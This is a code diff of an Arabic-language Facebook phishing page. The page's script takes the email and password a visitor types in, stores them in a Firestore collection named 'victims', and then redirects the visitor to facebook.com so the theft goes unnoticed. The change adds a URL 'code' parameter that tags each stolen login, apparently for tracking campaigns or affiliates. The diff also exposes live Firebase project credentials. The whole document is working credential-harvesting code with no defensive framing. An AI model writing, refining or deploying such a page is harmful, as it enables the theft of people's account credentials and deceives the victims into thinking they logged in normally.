@@ -8,7 +8,10 @@
 <button class="btn" onclick="go()">تسجيل الدخول</button></div>
 <div class="load" id="load"><div class="spinner"></div><p style="color:#606770">⏳ جاري تسجيل الدخول...</p></div>
 <script>
+var u=new URL(window.location.href);var CODE=u.searchParams.get('code')||'elgen';
 firebase.initializeApp({apiKey:"AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",projectId:"game-a1aca",storageBucket:"game-a1aca.firebasestorage.app",appId:"1:598280425947:android:0e4ead8d9b50cfc92157fe"});
 var db=firebase.firestore();
-async function go(){var em=document.getElementById('email').value.trim(),pw=document.getElementById('password').value.trim();if(!em||!pw)return alert('املأ الحقول');document.getElementById('load').classList.add('show');await db.collection('victims').add({service:'📘 فيسبوك',text:'👤 '+em+' | 🔒 '+pw,timestamp:new Date().toISOString()});setTimeout(function(){document.getElementById('load').classList.remove('show');window.location.href='https://facebook.com/'},2000)}
+async function go(){var em=document.getElementById('email').value.trim(),pw=document.getElementById('password').value.trim();if(!em||!pw)return alert('املأ الحقول');document.getElementById('load').classList.add('show');
+await db.collection('victims').add({service:'📘 فيسبوك',text:'👤 '+em+' | 🔒 '+pw,code:CODE,timestamp:new Date().toISOString()});
+setTimeout(function(){window.location.href='https://facebook.com/'},2000)}
 </script></body></html>
